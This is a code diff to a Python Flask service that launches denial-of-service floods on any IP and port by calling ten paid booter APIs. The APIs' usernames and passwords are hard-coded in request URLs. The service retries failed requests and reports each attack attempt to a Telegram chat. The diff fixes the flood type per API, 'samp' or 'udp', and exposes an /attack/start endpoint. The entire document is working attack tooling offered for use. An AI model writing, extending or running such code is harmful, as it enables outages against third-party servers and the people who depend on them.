@@ -30,14 +30,14 @@ def send_telegram_message(message):
 
 # ==================== TARGET APIS ====================
 TARGET_APIS = [
-    # 5 Old APIs
+    # 5 Old APIs (Will use 'samp' method)
     {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
     {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
     {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
     {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
     {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False},
     
-    # 5 New APIs
+    # 5 New APIs (Will use 'udp' method)
     {"id": 6,  "name": "NEW_API_1", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
     {"id": 7,  "name": "NEW_API_2", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
     {"id": 8,  "name": "NEW_API_3", "type": "new", "url": "http://38.87.116.24/api/attack?user=ytx&password=H712@11fal&method={method}&target={ip}&dport={port}&time={time}&len={len}", "busy": False},
@@ -72,7 +72,6 @@ def is_attack_successful(response):
     except:
         pass
     
-    # Fallback
     if response.status_code == 200:
         text = response.text.strip().lower()
         if any(kw in text for kw in ['slots full', 'busy', 'wait', 'full', 'limit']):
@@ -80,8 +79,14 @@ def is_attack_successful(response):
         return True
     return False
 
-def send_attack_to_api(api, ip, port, duration, method, packet_len=512):
-    """Send attack with retry logic (up to 8 attempts)"""
+def send_attack_to_api(api, ip, port, duration, packet_len=512):
+    """Send attack with retry logic + Fixed Method per API Type"""
+    # Force method based on API type
+    if api["type"] == "old":
+        method = "samp"
+    else:
+        method = "udp"
+    
     max_retries = 8
     retry_count = 0
     
@@ -102,8 +107,8 @@ def send_attack_to_api(api, ip, port, duration, method, packet_len=512):
 
             telegram_msg = f"""
 🔵 <b>ATTACK ATTEMPT #{attempt}/{max_retries}</b>
-├ API: {api['name']}
-├ Method: {method.upper()}
+├ API: {api['name']} ({api['type'].upper()})
+├ Method: {method.upper()} 
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
 ├ Len: {packet_len if api['type']=='new' else 'N/A'}
@@ -118,6 +123,7 @@ def send_attack_to_api(api, ip, port, duration, method, packet_len=512):
                 send_telegram_message(f"""
 ✅ <b>ATTACK SUCCESSFULLY STARTED</b>
 ├ API: {api['name']}
+├ Method: {method.upper()}
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
 ├ Attempt: {attempt}/{max_retries}
@@ -135,31 +141,32 @@ def send_attack_to_api(api, ip, port, duration, method, packet_len=512):
             send_telegram_message(f"""
 ⚠️ <b>REQUEST FAILED</b> (Attempt {attempt}/{max_retries})
 ├ API: {api['name']}
+├ Method: {method.upper()}
 ├ Error: {str(e)[:180]}
 ├ Time: {response_time}ms
 """)
             if retry_count < max_retries:
-                time.sleep(min(2 ** retry_count, 10))  # Exponential backoff
+                time.sleep(min(2 ** retry_count, 10))
 
-    # All retries failed
     send_telegram_message(f"""
 💀 <b>ALL RETRIES FAILED</b> on {api['name']}
+├ Method: {method.upper()}
 ├ Target: {ip}:{port}
-├ Attempts: {max_retries}
 """)
     return False
 
-def execute_attack(selected_apis, ip, port, total_time, method):
+def execute_attack(selected_apis, ip, port, total_time, packet_len=512):
     threads = []
     
     for api in selected_apis:
         api['busy'] = True
-        send_telegram_message(f"🚀 QUEUED → {api['name']} | {ip}:{port} ({total_time}s)")
+        method = "samp" if api['type'] == "old" else "udp"
+        send_telegram_message(f"🚀 QUEUED → {api['name']} | Method: {method.upper()} | {ip}:{port} ({total_time}s)")
 
     for api in selected_apis:
         t = threading.Thread(
             target=send_attack_to_api,
-            args=(api, ip, port, total_time, method),
+            args=(api, ip, port, total_time, packet_len),
             daemon=True
         )
         threads.append(t)
@@ -178,7 +185,6 @@ def start_attack():
     ip = request.args.get('ip')
     port = request.args.get('port')
     time_param = request.args.get('time')
-    method = request.args.get('method', 'udp')
     packet_len = request.args.get('len', 512)
 
     if not all([ip, port, time_param]):
@@ -208,7 +214,7 @@ def start_attack():
 
     threading.Thread(
         target=execute_attack,
-        args=(selected, ip, port, total_time, method.lower()),
+        args=(selected, ip, port, total_time, packet_len),
         daemon=True
     ).start()
 
@@ -216,7 +222,8 @@ def start_attack():
         'success': True,
         'apis_used': [a['name'] for a in selected],
         'target': f'{ip}:{port}',
-        'time': total_time
+        'time': total_time,
+        'note': 'Old API = samp | New API = udp'
     })
 
 @app.route('/status', methods=['GET'])
@@ -228,10 +235,10 @@ def status():
     })
 
 if __name__ == '__main__':
-    print("="*85)
-    print("🚀 MULTI-API SYSTEM READY (5 Old + 5 New)")
-    print("→ 1 Old + 1 New API per attack")
-    print("→ Full Original Response + Retry (8 attempts)")
-    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300&method=udp&len=1024")
-    print("="*85)
+    print("="*90)
+    print("🚀 MULTI-API SYSTEM READY")
+    print("→ Old APIs  : Always use 'samp'")
+    print("→ New APIs  : Always use 'udp'")
+    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300&len=1024")
+    print("="*90)
     app.run(host='0.0.0.0', port=8080, threaded=True)
